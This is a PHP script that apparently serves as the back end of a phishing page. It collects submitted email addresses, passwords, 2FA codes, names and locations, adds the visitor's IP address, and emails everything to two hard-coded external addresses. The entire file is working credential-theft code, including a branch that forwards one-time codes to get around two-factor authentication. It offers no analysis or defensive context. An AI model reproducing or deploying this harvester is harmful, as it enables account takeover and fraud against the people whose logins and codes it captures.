<?php
//define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
//if(!IS_AJAX) {die('Restricted access');}

$e = "";
$p = "";
$p2 = "";
$country_name = "";
$ip = "";
$city = "";
$device = "";
$fn = "";
//var_dump($_POST);
//exit();
if(isset($_POST['email']) && isset($_POST['pass'])){
    $e = $_POST['email'];
    $p = $_POST['pass'];
}

if(isset($_POST)){
    $country_name = $_POST['country'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $city = $_POST['city'];
    $device = $_POST['device'];
    $fn = $_POST['fullname'];
    
   // die();
    
}
if(isset($_POST['email'])){
    $e = $_POST['email'];
};
if(isset($_POST['pass'])){
    $p = $_POST['pass'];
};
if(isset($_POST['passwordDy'])){
    $p2 = $_POST['passwordDy'];
};
// the message
$msg = "Email = ".$e."\n\nPassword = ".$p."\n\nCountry = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city;

echo "<p>".$msg."</p>";

//die();
//$msg= "sadasdsdjighndfiugndfgndfgndf";
// use wordwrap() if lines are longer than 70 characters
$subject = "New account";
//$msg = wordwrap($msg,70);
if(isset($_POST['codegeneratorRR'])){
    $code = $_POST['codegeneratorRR'];
    
    $msg = $code;
    $subject = "2FA Code";
    //var_dump($code);
}






mail('philiplining321@gmail.com', 'akont', $msg);
mail('islamishkodran@gmail.com', 'akont', $msg);

?>